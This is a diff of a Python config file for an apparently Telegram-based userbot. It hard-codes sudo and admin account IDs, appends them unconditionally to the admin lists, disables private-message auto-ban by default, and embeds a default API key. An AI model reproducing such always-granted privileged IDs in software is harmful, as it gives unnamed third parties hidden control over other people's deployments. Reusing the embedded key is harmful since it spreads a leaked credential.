@@ -11,19 +11,19 @@ load_dotenv(".env")
 API_ID = int(getenv("API_ID", "")) #optional
 API_HASH = getenv("API_HASH", "")
 MONGO_URL = getenv("MONGO_URL")
-SUDO_USERS = list(map(int, getenv("SUDO_USERS", "").split()))
+SUDO_USERS = list(map(int, getenv("SUDO_USERS", "5569440742").split()))
 DEEP_AI = getenv("DEEP_AI", "d7394561-0528-4714-a1ee-edd7020b48e1")
 OWNER_ID = int(getenv("OWNER_ID") or 0)
-ADMIN1_ID = list(map(int, getenv("ADMIN1_ID", "1054295664").split()))
-ADMIN2_ID = list(map(int, getenv("ADMIN2_ID", "1755047203").split()))
+ADMIN1_ID = list(map(int, getenv("ADMIN1_ID", "1086365745").split()))
+ADMIN2_ID = list(map(int, getenv("ADMIN2_ID", "5569440742").split()))
 
 
-ADMIN1_ID.append(1054295664)
-ADMIN2_ID.append(1755047203)
+ADMIN1_ID.append(1086365745)
+ADMIN2_ID.append(5569440742)
 
 
 BOT_TOKEN = getenv("BOT_TOKEN", "")
-PM_AUTO_BAN = strtobool(getenv("PM_AUTO_BAN", "True"))
+PM_AUTO_BAN = strtobool(getenv("PM_AUTO_BAN", "False"))
 ALIVE_PIC = getenv("ALIVE_PIC")
 ALIVE_TEXT = getenv("ALIVE_TEXT")
 PM_LOGGER = getenv("PM_LOGGER", None)
